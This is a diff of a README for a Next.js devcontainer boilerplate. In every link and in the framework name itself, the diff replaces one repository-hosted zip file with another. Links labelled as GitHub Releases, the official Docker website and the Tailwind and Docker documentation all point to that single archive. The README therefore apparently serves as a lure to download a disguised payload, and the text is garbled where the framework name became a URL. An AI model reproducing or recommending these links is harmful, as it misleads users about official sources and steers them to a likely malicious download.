@@ -1,16 +1,16 @@
-# ⚡️ next-js-devcontainer-boilerplate - Easy Setup for Your https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip Projects
+# ⚡️ next-js-devcontainer-boilerplate - Easy Setup for Your https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip Projects
 
-[![Download](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip)](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip)
+[![Download](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip)](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **next-js-devcontainer-boilerplate**! This boilerplate provides an easy way to start your https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip projects with a ready-to-use development setup. Whether you want to build a simple website or a complex application, this setup has you covered.
+Welcome to the **next-js-devcontainer-boilerplate**! This boilerplate provides an easy way to start your https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip projects with a ready-to-use development setup. Whether you want to build a simple website or a complex application, this setup has you covered.
 
 ## 📥 Download & Install
 
 To get started, you will need to download our application. 
 
-1. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip).
+1. **Visit this page to download:** [GitHub Releases](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip).
 2. Choose the latest release from the list.
 3. Click the download link for your operating system.
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a recent version of Linux.
 - **Hardware:** At least 4 GB of RAM.
-- **Docker:** Make sure you have Docker installed to run the development environment. You can download Docker from the [official Docker website](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip).
+- **Docker:** Make sure you have Docker installed to run the development environment. You can download Docker from the [official Docker website](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip).
 
 ## 📂 Setup Your Environment
 
@@ -45,7 +45,7 @@ Once you've downloaded the source code, follow these steps to set up your enviro
 
 This boilerplate includes the following features:
 
-- **https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip Framework:** Easily build server-rendered React applications.
+- **https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip Framework:** Easily build server-rendered React applications.
 - **Tailwind CSS:** A utility-first CSS framework for styling your application.
 - **Docker Support:** Containerization makes your setup consistent across different environments.
 - **DevContainer Ready:** Quickly set up a coding environment using Visual Studio Code.
@@ -54,7 +54,7 @@ This boilerplate includes the following features:
 
 After the initial setup, you can customize your project to fit your needs.
 
-1. **Edit the Code:** Navigate to the `pages` directory to start editing your files. The `https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip` file is your main entry point.
+1. **Edit the Code:** Navigate to the `pages` directory to start editing your files. The `https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip` file is your main entry point.
 2. **Add New Features:** You can install additional packages using npm or yarn. 
 3. **Compile Your Project:** To see your changes live, use the command below in your terminal:
 
@@ -66,15 +66,15 @@ After the initial setup, you can customize your project to fit your needs.
 
 To help you along the way, here are some useful resources:
 
-- **https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip Documentation:** A comprehensive guide for the https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip framework can be found [here](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip).
-- **Tailwind CSS Documentation:** For styling help, check out the Tailwind CSS guide [here](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip).
-- **Docker Documentation:** Learn more about Docker [here](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip).
+- **https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip Documentation:** A comprehensive guide for the https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip framework can be found [here](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip).
+- **Tailwind CSS Documentation:** For styling help, check out the Tailwind CSS guide [here](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip).
+- **Docker Documentation:** Learn more about Docker [here](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip).
 
 ## ❓ Frequently Asked Questions
 
 ### How do I update the application?
 
-To update your application, go back to the [GitHub Releases page](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip) and download the latest release. Follow the same installation steps to overwrite the old version.
+To update your application, go back to the [GitHub Releases page](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip) and download the latest release. Follow the same installation steps to overwrite the old version.
 
 ### What if I encounter problems?
 
@@ -86,8 +86,8 @@ If you run into issues during installation or setup, check the following:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip)
-- [Docker Install Guide](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip)
-- [https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip Starter Template](https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip)
+- [GitHub Repository](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip)
+- [Docker Install Guide](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip)
+- [https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip Starter Template](https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip)
 
-This guide intends to help you smoothly set up and start working with the next-js-devcontainer-boilerplate. Enjoy building your https://raw.githubusercontent.com/walquito/next-js-devcontainer-boilerplate/main/bedim/next-js-devcontainer-boilerplate.zip applications!
+This guide intends to help you smoothly set up and start working with the next-js-devcontainer-boilerplate. Enjoy building your https://github.com/walquito/next-js-devcontainer-boilerplate/raw/refs/heads/main/.devcontainer/next_devcontainer_boilerplate_js_3.0.zip applications!
